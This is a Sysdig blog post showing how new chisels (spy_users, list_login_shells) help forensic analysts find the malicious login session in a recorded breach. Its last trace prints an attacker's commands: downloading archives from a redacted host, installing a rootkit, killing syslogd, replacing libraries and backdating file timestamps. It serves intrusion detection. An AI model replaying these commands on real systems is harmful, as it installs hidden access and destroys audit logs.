---
ID: 231
post_title: 'Fishing for Hackers (Part 2): Quickly Identify Suspicious Activity With Sysdig'
author: Loris Degioanni
post_excerpt: ""
layout: post
permalink: >
  https://sysdigrp2rs.wpengine.com/blog/fishing-for-hackers-part-2/
published: true
post_date: 2014-07-02 09:00:21
---
In our recent [Fishing for Hackers][1] blog post, we explored a sysdig trace of an actual system breach from an actual malicious attacker. Based on the interest in that post, and the great feedback that we've received since publishing it, we decided to spend some time making the forensics features of [sysdig][2] even better. Updates in the [latest release][3] include: 
*   A new chisel, list_login_shells
*   Improvements to the spy_users chisel
*   Additional useful filter fields In this post, I'd like to show you how to use these new features to investigate your trace files with even more ease, and quickly identify that prime catch. 

## Sorting Through the Fishing Net

Other than in trivial situations, the commands executed on a unix system are launched from multiple login sessions, each of which can either be strictly interactive, or run scripts, or a mix of the two. From the forensics point of view, it’s important to quickly uncover the “interesting” sessions, separating them from noisy scripts - this is usually nontrivial and time intensive.

The revamped spy_users chisel provides better support for this kind of investigation. Let’s apply it to the trace file captured for the original Fishing for Hackers blog post.

<pre>sysdig -r trace.scap.gz -c spy_users
4893 01:39:38 root) /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc
update-motd.d
4893 01:39:38 root) run-parts --lsbsysinit /etc/update-motd.d
4893 01:39:38 root) /bin/sh /etc/update-motd.d/00-header
4893 01:39:38 root) uname -o
4893 01:39:38 root) uname -r
4893 01:39:38 root) uname -m
4893 01:39:38 root) /bin/sh /etc/update-motd.d/10-help-text
4893 01:39:38 root) grep -qs -server
4893 01:39:38 root) uname -r
4893 01:39:38 root) /bin/sh /etc/update-motd.d/50-landscape-sysinfo
4893 01:39:38 root) grep -c ^processor /proc/cpuinfo
4893 01:39:38 root) bc
4893 01:39:38 root) cut -f1 -d /proc/loadavg
4893 01:39:38 root) /bin/date
4893 01:39:38 root) /usr/bin/python /usr/bin/landscape-sysinfo
4893 01:39:38 root) sh -c /sbin/ldconfig -p 2&gt;/dev/null
4893 01:39:38 root) /bin/sh /sbin/ldconfig -p
4893 01:39:38 root) /sbin/ldconfig.real -p
4893 01:39:38 root) sh -c /sbin/ldconfig -p 2&gt;/dev/null
4893 01:39:38 root) /bin/sh /sbin/ldconfig -p
4893 01:39:38 root) /sbin/ldconfig.real -p
…
</pre>

You can notice a couple of things:

*   Each line begins with a number: that’s the pid of the first shell of the session, in other words a unique ID for the session. That way, it’s possible to follow a specific session even when several of them are active at the same time.
*   The executed commands are indented, based on the following rule: when a new shell is executed, the indentation increases. This is useful because, typically, a shell that executes another shell is running a script. Thus, the indentation clearly separates real users’ interactions from the scripts they execute.

Since interesting activity usually happens at higher levels in the tree (ie. less indentation), spy_users now includes an optional argument to filter the output based on the indentation level. For example

<pre>sysdig -r trace.scap.gz –c spy_users 0</pre>

will only show activity in an original starting shell, while

<pre>sysdig -r trace.scap.gz –c spy_users 1</pre>

will show activity in that shell and its children.

## Finding the Prime Catch

Still, even with this improved readability, finding the needle in the haystack can be challenging, especially on busy machines. Fortunately, the new list_login_shells chisel comes to our rescue. In the simplest case, this chisel shows the ids of all the login sessions detected in the trace file. Let’s try it!

<pre>sysdig.exe -r trace.scap.gz -c list_login_shells
All shells:
7791
7588
7604
5580
7628
7632
7601
7573
5322
7625
7737
7773
7660
7658
7655
7598
7610
7619
7574
7654
5582
7622
5052
7581
7584
4893
7591
5578
5459
5574
7616
7595
7607
5564
7575
5575
7613
7631
</pre>

Quite a lot of activity! 38 sessions, to be precise. We know one of them contains a successful hacker penetration, but which one is it?

list_login_shells has two optional parameters. The first one makes it possible to search for sessions that contain the specified command name, while the second one does the same but with the command arguments.

In the context of detecting attacks, interesting sessions tend to contain commands like ssh and wget, and arguments that include /etc or /bin. In this case, I’m going to search for the execution of tar, assuming it’s a good indication that someone is trying to install something on my system:

<pre>sysdig.exe -r g.scap -c list_login_shells tar
Shells containing tar:
5459</pre>

Much better, this time I get only one session! Now I can use the proc.loginshellid sysdig filter field to restrict the output of spy_users.

<pre>sysdig.exe -r trace.scap.gz -c spy_users proc.loginshellid=5459
5459 01:47:10 root) groups
5459 01:47:10 root) uname -s
5459 01:47:10 root) sed -ne /^# START exclude/,/^# FINISH exclude/p /etc/bash_completion
5459 01:47:10 root) ls /etc/bash_completion.d
5459 01:47:10 root) sed s,x,x,
5459 01:47:10 root) sed s,x,x,
5459 01:47:10 root) sed s,x,x,
5459 01:47:10 root) sed s,x,x,
5459 01:47:10 root) sed s,x,x,
5459 01:47:10 root) sed s,x,x,
5459 01:47:10 root) sed s,x,x,
5459 01:47:10 root) sed s,x,x,
5459 01:47:10 root) sed s,x,x,
5459 01:47:10 root) sed s,x,x,
5459 01:47:11 root) sed s,x,x,
5459 01:47:11 root) sed s,x,x,
5459 01:47:11 root) /bin/sh /usr/bin/lesspipe
5459 01:47:11 root) basename /usr/bin/lesspipe
5459 01:47:11 root) dirname /usr/bin/lesspipe
5459 01:47:11 root) cd /usr/bin
5459 01:47:11 root) dircolors -b
5459 01:47:11 root) mesg n
5459 01:48:13 root) cd /usr/sbin
5459 01:48:15 root) mkdir .shm
5459 01:48:17 root) cd /usr/sbin/.shm
5459 01:48:18 root) wget XXX/l.tgz
5459 01:48:20 root) tar zxvf l.tgz
5459 01:48:20 root) gzip -d
5459 01:50:40 root) ps -x
5459 01:50:43 root) ps -x
5459 01:50:47 root) w
5459 01:50:50 root) passwd
5459 01:52:21 root) cd /usr/sbin
5459 01:52:21 root) wget XXX/rk.tar
5459 01:52:24 root) tar xvf rk.tar
5459 01:52:24 root) rm -rf rk.tar
5459 01:52:24 root) cd /usr/sbin/rk
5459 01:52:24 root) /bin/bash ./root whathefuckyouwant 1157
5459 01:52:24 root) sleep 5
5459 01:52:29 root) tar zxf mafixlibs
5459 01:52:29 root) gzip -d
5459 01:52:29 root) whoami
5459 01:52:29 root) cd /usr/sbin/rk
5459 01:52:29 root) sleep 1
5459 01:52:30 root) killall -9 syslogd
5459 01:52:30 root) date +%S
5459 01:52:30 root) uname -n
5459 01:52:30 root) mv bin/lib/libproc.a /lib/
5459 01:52:30 root) mv bin/lib/libproc.so.2.0.6 /lib/
5459 01:52:30 root) /bin/sh /sbin/ldconfig
5459 01:52:30 root) /sbin/ldconfig.real
5459 01:52:31 root) cd /usr/sbin/rk/bin
5459 01:52:31 root) md5sum
5459 01:52:31 root) touch -acmr /bin/ls /etc/sh.conf
...
</pre>

Look at how clean this trace is. A hacker catch in all its splendor. Including the download of multiple malicious files and the execution of scripts with names such as whathefuckyouwant. And it keeps going on and on.

## Conclusion

Hopefully these new features make it even easier for you to explore users' activity within your sysdig traces (whether malicious or not!). In order to leverage the features shown in this post, make sure to update to the latest version of sysdig (instructions [here][4]). And as always, if you have comments, questions, or proposals for improvements, please let us know in the comments on Hacker News using the link below.

 

Thanks for reading our “Fishing for Hackers” blog post! We’re actually looking to create something security-specific with Sysdig and were looking for companies to brainstorm with. Do you have time to meet me next week to discuss? [Contact us here][5] and we’ll set up a meeting with Loris, the creator of sysdig.

 [1]: https://sysdigrp2rs.wpengine.com/fishing-for-hackers/
 [2]: http://www.sysdig.org/
 [3]: https://sysdigrp2rs.wpengine.com/announcing-sysdig-0-1-84/
 [4]: https://github.com/draios/sysdig/wiki/Sysdig%20Update%20and%20Uninstall
 [5]: http://goo.gl/forms/hvno47KgnS